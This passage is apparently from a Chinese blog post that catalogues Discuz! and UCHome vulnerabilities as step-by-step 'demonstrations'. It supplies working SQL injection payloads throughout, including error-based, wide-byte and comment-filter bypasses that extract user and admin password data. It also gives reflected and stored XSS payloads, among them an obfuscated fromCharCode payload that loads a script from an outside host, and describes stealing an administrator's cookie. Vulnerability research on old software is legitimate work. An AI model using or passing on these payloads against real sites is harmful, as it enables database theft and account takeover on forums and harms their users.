<h3 id="演示6：UChome-注入漏洞1"><a href="#演示6：UChome-注入漏洞1" class="headerlink" title="演示6：UChome 注入漏洞1"></a>演示6：UChome 注入漏洞1</h3><p>首先注册用户 然后新建一个相册<br><a href="http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me">http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me</a> 打开这里点上传<br>新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片<br>直接确认 然后抓包 把titie的那个改成 title%5B1’ and (select 1 from (select<br>count(),concat(version(),floor(rand(0)2))x from information_schema.tables group<br>by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b253b877f2608abb78cf36512ad2179e.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93618">https://www.seebug.org/vuldb/ssvid-93618</a></p>
<h3 id="演示7：UChome-注入漏洞2"><a href="#演示7：UChome-注入漏洞2" class="headerlink" title="演示7：UChome 注入漏洞2"></a>演示7：UChome 注入漏洞2</h3><p>注册用户后登陆 然后点击日志 创建新日志 然后打开BURP进行抓包<br>找一个没有用的POST选项 改成picids[‘] 然后在提交 就可以看到结果了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/295ac8423cf91b32c8f202dcbf79d357.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/199e997d938cc2d2e3f8ffc1d061c07d.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93616">https://www.seebug.org/vuldb/ssvid-93616</a></p>
<h3 id="演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞"><a href="#演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞" class="headerlink" title="演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞"></a>演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞</h3><p><a href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>&#x3D;</p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;resideprovince">http://ip/jiaoyou.php?mod=search&amp;resideprovince</a>&#x3D;</p>
<p>pid、residecity、resideprovince参数均存在SQL注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/dd22c1792c7d1a99a4a3b8589a9d8286.png" class>

<p>参考链接：</p>
<p><a href="https://www.unhonker.com/bug/1058.html">https://www.unhonker.com/bug/1058.html</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<h3 id="演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞"><a href="#演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞" class="headerlink" title="演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞"></a>演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞</h3><p>在discuz<br>v63积分商城插件注入漏洞exp中并不需要斜杠、#号和—注释符。所以会执行$clean &#x3D;<br>preg_replace(“&#x2F;’(.+?)’&#x2F;s”, ”,<br>$sql);原来SQL语句中两个单引号中间的内容就会被替换为空。并不会进入到下面的else分支。Else下面的所有操作均是对$clean变量的操作。所以绕过的思路就是把SQL语句放在两个单引号中间。对于mysql的一个特性，<br>@`’`<br>是为空的，所以我们的攻击语句可以放到两个@`’`中间，即使GPC开启，单引号被转义为\’，而@`’`变成@`\’`对注入也是没有影响的，所以此绕过方法无限制。</p>
<p>即针对该注入漏洞的攻击EXP为：</p>
<p><a href="http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a> or<br>@`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select<br>user()))a from information_schema.tables group by a)b) or @`’` or @`’` and<br>(select * from (select count(*),concat(floor(rand(0)*2),(select user()))a<br>from information_schema.tables group by a)b) or @`’`</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/df2d41ccd913943f04b53d832c737ae0.png" class>

<p>可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。</p>
<p>参考链接：<a href="http://netsecurity.51cto.com/art/201303/386717.htm">http://netsecurity.51cto.com/art/201303/386717.htm</a></p>
<h3 id="演示10：Discuz-x1-5-x2-0-二次注射"><a href="#演示10：Discuz-x1-5-x2-0-二次注射" class="headerlink" title="演示10：Discuz x1.5 x2.0 二次注射"></a>演示10：Discuz x1.5 x2.0 二次注射</h3><p>访问<a href="http://xxxxx/forum.php?mod=misc&amp;tid=%7B1%7D&amp;action=postappend&amp;pid=%7B2%7D%E8%BF%9B%E5%85%A5%E5%9B%9E%E5%A4%8D%E4%B8%BB%E9%A2%98%E7%95%8C%E9%9D%A2%E3%80%82%E5%9C%A8%E5%8F%91%E8%A1%A8%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%9C%B0%E6%96%B9%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E3%80%82%E5%A6%82%E8%BE%93%E5%85%A5%E2%80%9Ca&#39;,\%60subject\%60=">http://xxxxx/forum.php?mod=misc&amp;tid={1}&amp;action=postappend&amp;pid={2}进入回复主题界面。在发表回复的地方存在SQL注入。如输入“a&#39;,\`subject\`=</a>(&#x2F;*!select*&#x2F;<br>group_concat(uid,’:’) from pre_common_member where groupid&#x3D;1),comment&#x3D;’”。</p>
<p>刷新页面，可在主题回复中看到管理用户。</p>
<p>参考链接：<a href="https://www.webshell.cc/562.html">https://www.webshell.cc/562.html</a></p>
<h3 id="演示11：Discuz-X2-forum-attachment-php-sql注入漏洞"><a href="#演示11：Discuz-X2-forum-attachment-php-sql注入漏洞" class="headerlink" title="演示11：Discuz! X2 forum_attachment.php sql注入漏洞"></a>演示11：Discuz! X2 forum_attachment.php sql注入漏洞</h3><p><a href="http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>&#x3D;</p>
<p>链接中，aid参数存在SQL注入，但需要把SQL语句进行base64编码，如</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b018839dadf33e4620e75cef37ac7a90.png" class>

<p>参考链接：<a href="https://www.cnblogs.com/devi1o/articles/4874822.html">https://www.cnblogs.com/devi1o/articles/4874822.html</a></p>
<h3 id="演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞"><a href="#演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞" class="headerlink" title="演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞"></a>演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞</h3><p><a href="http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>moodid存在SQL注入。</p>
<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93710">https://www.seebug.org/vuldb/ssvid-93710</a></p>
<h3 id="演示13：Discuz-论坛wap功能模块编码的注射漏洞"><a href="#演示13：Discuz-论坛wap功能模块编码的注射漏洞" class="headerlink" title="演示13：Discuz!论坛wap功能模块编码的注射漏洞"></a>演示13：Discuz!论坛wap功能模块编码的注射漏洞</h3><p><a href="http://xxxxxxx/space.php?username">http://xxxxxxx/space.php?username</a>&#x3D;</p>
<p>username存在SQL注入，但可能此处会把’过滤成\’，如果是GBK编码的话，可使用宽字节注入的思路绕过。如设置payload为：&#x2F;space.php?username&#x3D;%cf’%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,password,50,51,52,53,54,55,56,57,database(),59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84%20from%20cdb_members%20where%20uid&#x3D;1&#x2F;*</p>
<p>参考链接：</p>
<p><a href="http://www.vfocus.net/art/20080819/3755.html">http://www.vfocus.net/art/20080819/3755.html</a></p>
<p><a href="https://www.jb51.net/hack/12858.html">https://www.jb51.net/hack/12858.html</a></p>
<h3 id="演示14：Discuz-pm-php注入"><a href="#演示14：Discuz-pm-php注入" class="headerlink" title="演示14：Discuz! pm.php注入"></a>演示14：Discuz! pm.php注入</h3><p><a href="http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1">http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1</a></p>
<p>id参数存在SQL注入。</p>
<p>参考链接：<a href="http://www.hack6.com/wzle/gf/20140208/39554.html">http://www.hack6.com/wzle/gf/20140208/39554.html</a></p>
<h3 id="演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在管理后台-工具-数据-调用-自定义模块存在SQL注入，详情看图即可明白</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/88a65fe6d045049abf00a12f417fc72f.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4b91c80f9526cd448e60a904e4e32d41.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b5a668d79a3a0b596c54ea1009cb4479.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="漏洞POC："><a href="#漏洞POC：" class="headerlink" title="漏洞POC："></a>漏洞POC：</h3><p>Discuz! 4.x SQL injection POC</p>
<p><a href="https://www.exploit-db.com/exploits/2859/">https://www.exploit-db.com/exploits/2859/</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-5482">https://www.seebug.org/vuldb/ssvid-5482</a></p>
<p>Discuz! 5.0.0 RC1 SQL injection PoC</p>
<p><a href="http://blog.sina.com.cn/s/blog_56fb0f050100055g.html">http://blog.sina.com.cn/s/blog_56fb0f050100055g.html</a></p>
<p>Discuz! 5.0.0 GBK SQL Injection &#x2F; Admin Credentials Disclosure Exploit</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-16732">https://www.seebug.org/vuldb/ssvid-16732</a></p>
<p>Discuz! 5 SQL injection Exploit</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-5263">https://www.seebug.org/vuldb/ssvid-5263</a></p>
<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p><strong>漏洞描述：跨站脚本攻击漏洞，恶意攻击者往web页面插入恶意脚本代码，而程序对于用户输入内容未过滤，当用户浏览该页之时，嵌入其中web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。窃取cookie、放蠕虫、网站钓鱼……</strong>。涉及URL如下：</p>
<p>##&#x2F;include&#x2F;global.func.php—&gt;演示1</p>
<p><a href="http://ip/admincp.php?infloat=yes&amp;handlekey=123">http://ip/admincp.php?infloat=yes&amp;handlekey=123</a></p>
<p><a href="http://ip/logging.php?infloat=yes&amp;handlekey=123">http://ip/logging.php?infloat=yes&amp;handlekey=123</a></p>
<p><a href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123</a></p>
<p>##logging.php—&gt;演示2</p>
<p><a href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer</a>&#x3D;</p>
<p>##source&#x2F;function&#x2F;function_core.php—&gt;演示3</p>
<p><a href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有3个功能或插件存在反射型XSS</p>
<h3 id="演示1：Discuz-7-2-反射型xss漏洞1"><a href="#演示1：Discuz-7-2-反射型xss漏洞1" class="headerlink" title="演示1：Discuz 7.2 反射型xss漏洞1"></a>演示1：Discuz 7.2 反射型xss漏洞1</h3><p>访问以下链接即可触发XSS：</p>
<p><a href="http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/admincp.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a href="http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/logging.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a><br><a href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123);alert(/xss/);//</a></p>
<p>参考链接：<a href="http://www.bubuko.com/infodetail-2094064.html">http://www.bubuko.com/infodetail-2094064.html</a></p>
<h3 id="演示2：Discuz-7-2-反射型xss漏洞2"><a href="#演示2：Discuz-7-2-反射型xss漏洞2" class="headerlink" title="演示2：Discuz 7.2 反射型xss漏洞2"></a>演示2：Discuz 7.2 反射型xss漏洞2</h3><p>访问如下链接即可触发</p>
<p><a href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert(document.domain)-">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert%28document.domain%29-</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d57b73372148026c6028251ddc12ef7c.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-89252">https://www.seebug.org/vuldb/ssvid-89252</a></p>
<h3 id="演示3：Disucz-X3-2-多处反射型XSS漏洞"><a href="#演示3：Disucz-X3-2-多处反射型XSS漏洞" class="headerlink" title="演示3：Disucz X3.2 多处反射型XSS漏洞"></a>演示3：Disucz X3.2 多处反射型XSS漏洞</h3><p><a href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b9188996d2c703cc4eef76d4c40540dc.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9477cbf714cb2776e884a98262745922.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93719">https://www.seebug.org/vuldb/ssvid-93719</a></p>
<h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><p><strong>漏洞描述：</strong>攻击者可指定任意用户的会话session等会话校验字符串。攻击者可以轻松指定任意用户的session，待诱导用户登录之后，直接使用此session登录用户账号。多常见于此类字段存在于url登录地址中的情况。涉及URL如下：</p>
<p>##直播功能-&gt;演示1</p>
<p>##发帖&#x2F;回复-编辑功能-&gt;演示2</p>
<p>##链接格子插件-&gt;演示3</p>
<p>##添加链接处（如发帖时可添加链接）-&gt;演示4</p>
<p>##后台禁言处-&gt;演示5</p>
<p>##上传附件处-&gt;演示6</p>
<p>##抢楼-奖励楼层处-&gt;演示7</p>
<p>##添加视频处-&gt;演示8</p>
<p>##发表日志处-&gt;演示9</p>
<p>##头像设置处-&gt;演示10</p>
<p>##个人签名处-&gt;演示11</p>
<p>##discuz7.x发帖回帖处-&gt;演示12</p>
<p>## trade.php-&gt;演示13</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有13个功能或插件存在反射型XSS</p>
<h3 id="演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）"><a href="#演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）" class="headerlink" title="演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）"></a>演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）</h3><p>discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~<br>接着咱们就用admin帐号先把一个帖子弄成直播！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/58408e5396ca116e16614a9b1601e894.png" class>

<p>先把payload进行base16编码（如果不拦截，直接上原始payload）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/281d7fb89a658cff5a42b07217026d24.png" class>

<p>在直播发帖处进行发表</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5cc92bcad46824d7e41f06de5116aeb4.png" class>

<p>弹窗~</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1f16610a47e54f4cc664d28a18009681.png" class>

<p>参考链接：</p>
<p><a href="https://www.secpulse.com/archives/33389.html">https://www.secpulse.com/archives/33389.html</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93716">https://www.seebug.org/vuldb/ssvid-93716</a></p>
<h3 id="演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过："><a href="#演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过：" class="headerlink" title="演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过："></a>演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：</h3><p>此处演示绕过：在发帖或回复处添加“[email]2”onmouseover&#x3D;”alert(2)[&#x2F;email]”</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/2192718863ecc37e99869241f451f578.png" class>

<p>然后对帖子或者评论进行编辑时，与页面进行一定交互时即可触发 XSS：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/933da97c673d2b6b86e5a9beb7a82ebf.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ac627b1480f42a10d09faa7840daa07c.png" class>

<p>参考链接：</p>
<p><a href="http://0day5.com/archives/3323/">http://0day5.com/archives/3323/</a></p>
<p>20150609补丁绕过：<a href="http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/">http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/</a></p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=139851">https://bugs.shuimugan.com/bug/view?bug_no=139851</a></p>
<h3 id="演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞"><a href="#演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞" class="headerlink" title="演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞"></a>演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞</h3><p>在论坛自助购买广告位处，在“文字内容中”填写”&gt;&lt;img&#x2F;src&#x3D;1&#x2F;&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0a1d28d7afb2ed43aef928c51971b5b6.png" class>

<p>在管理后台-应用-自助广告位可发现弹出窗口</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9272dfb415c08bb154c70dad8f506bb3.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-90006">https://www.seebug.org/vuldb/ssvid-90006</a></p>
<h3 id="演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员"><a href="#演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员" class="headerlink" title="演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员"></a>演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员</h3><p>在添加链接处，如添加友链或发帖内容填写友链处。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/841d5c2797f52d13ec241c760a420b06.png" class>

<p>添加xss代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/674987aa9589354b68b27a937e94b9e3.png" class>

<p>等管理员审核的时候获取到cookie</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/284a885c94357c2a6a88414d3296b872.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93713">https://www.seebug.org/vuldb/ssvid-93713</a></p>
<h3 id="演示5：Discuz-X2-5后台禁言xss"><a href="#演示5：Discuz-X2-5后台禁言xss" class="headerlink" title="演示5：Discuz! X2.5后台禁言xss"></a>演示5：Discuz! X2.5后台禁言xss</h3><p>在论坛首页管理 禁止用户那 输入你能管理的用户名称 然后选择禁言 理由那插入payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9ed50fd51c80d44b30d1b346fd2cef76.png" class>

<p>漏洞证明</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b32950a12dcb7fb8188dc1dc80af34c6.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93645">https://www.seebug.org/vuldb/ssvid-93645</a></p>
<h3 id="演示6：Discuz-附件解析漏洞导致XSS"><a href="#演示6：Discuz-附件解析漏洞导致XSS" class="headerlink" title="演示6：Discuz!附件解析漏洞导致XSS"></a>演示6：Discuz!附件解析漏洞导致XSS</h3><p>先新建一个php文件，写入XSS代码：&lt;img src&#x3D;1 onerror&#x3D;alert(document.cookie)&gt;</p>
<p>然后保存再将它的后缀名字改成.rar，然后上传附件。点击附件下载，提示即将下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/68a8742a947fff02992951aa0cac2316.png" class>

<p>右键审查元素得到一个类似下面这样附件的地址（这里不是直接在帖子中得到地址而是通过下载提示之后）</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3ad2d67da7ddda9a1debbcf85297ab27.png" class>

<p>在地址后添加一段：-request-文件名.php.html，如下：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8a939e7d6a3e0c9ac4914baea21cd08c.png" class>

<p>当作html执行，XSS代码被触发！</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f98ab82c6ad15ee808a9ca7d8c1e3901.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93631">https://www.seebug.org/vuldb/ssvid-93631</a></p>
<h3 id="演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS"><a href="#演示7：DiscuzX3-1-x2F-X3-x2F-X2-5-x2F-X2-抢楼存在存储型XSS" class="headerlink" title="演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS"></a>演示7：DiscuzX3.1&#x2F;X3&#x2F;X2.5&#x2F;X2 抢楼存在存储型XSS</h3><p>在抢楼-奖励楼层处添加payload</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/bacf4d3c7ada780dd70336aa196f1f6e.png" class>

<p>完成后触发xss</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a2f59445cab6af38a983487f3dc6f5f2.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93620">https://www.seebug.org/vuldb/ssvid-93620</a></p>
<h3 id="演示8：Ucenter-Home-2-0及以下存储型XSS"><a href="#演示8：Ucenter-Home-2-0及以下存储型XSS" class="headerlink" title="演示8：Ucenter Home 2.0及以下存储型XSS"></a>演示8：Ucenter Home 2.0及以下存储型XSS</h3><p>在插入视频处，如发帖处的插入视频，设置如下payload: [flash]http:&#x2F;&#x2F;“<br>onmouseover&#x3D;’document.body.innerHTML&#x3D;String.fromCharCode(60,105,102,114,97,109,101,47,111,110,108,111,97,100,61,39,106,97,118,97,115,99,114,105,112,116,58,119,114,105,116,101,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,54,48,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,51,50,44,49,49,53,44,49,49,52,44,57,57,44,54,49,44,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,53,56,44,52,55,44,52,55,44,49,49,54,44,49,48,57,44,49,50,48,44,49,48,55,44,52,54,44,49,49,49,44,49,49,52,44,49,48,51,44,52,55,44,49,49,51,44,52,54,44,49,48,54,44,49,49,53,44,54,50,44,54,48,44,52,55,44,49,49,53,44,57,57,44,49,49,52,44,49,48,53,44,49,49,50,44,49,49,54,44,54,50,41,41,39,62)’[&#x2F;flash]</p>
<p>完成后弹窗</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d2b13fa78846d28742ffa82191b67c04.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93654">https://www.seebug.org/vuldb/ssvid-93654</a></p>
<h3 id="演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞"><a href="#演示9：Discuz-X2-5最新版本-日志功能存在XSS漏洞" class="headerlink" title="演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞"></a>演示9：Discuz! X2.5最新版本 日志功能存在XSS漏洞</h3><p>在发表日志内容处添加XSS代码</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/458c96f71cf70ad50ab21933475bd6f5.png" class>

<p>完成后触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/62054f437d9ba49e73fd2678d1fdb77e.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93665">https://www.seebug.org/vuldb/ssvid-93665</a></p>
<h3 id="演示10：Discuz-4-0-头像设置处可以持久型脚本"><a href="#演示10：Discuz-4-0-头像设置处可以持久型脚本" class="headerlink" title="演示10：Discuz 4.0 头像设置处可以持久型脚本"></a>演示10：Discuz 4.0 头像设置处可以持久型脚本</h3><p>头像设置处，先选一个系统自带头像，提交，抓包。<br>将头像地址“customavatars&#x2F;190.jpg”替换为xss脚本“javascript:alert(&#x2F;大家新年快乐啊！&#x2F;)”（此处会过滤&lt;,”,’），post提交后，触发XSS</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1638f9cf5984633cb55be99ae37d7eaf.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93680">https://www.seebug.org/vuldb/ssvid-93680</a></p>
<h3 id="演示11：Discuz-所有版本永久型跨站漏洞"><a href="#演示11：Discuz-所有版本永久型跨站漏洞" class="headerlink" title="演示11：Discuz! 所有版本永久型跨站漏洞"></a>演示11：Discuz! 所有版本永久型跨站漏洞</h3><p>个人中心里的“个人签名”没有对恶意代码进行检测，在 Discuz! 及 img<br>代码禁用的情况下仍可写入恶意代码，Discuz! 会保存并执行该代码，形成永久型跨站。</p>
<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-19342">https://www.seebug.org/vuldb/ssvid-19342</a></p>
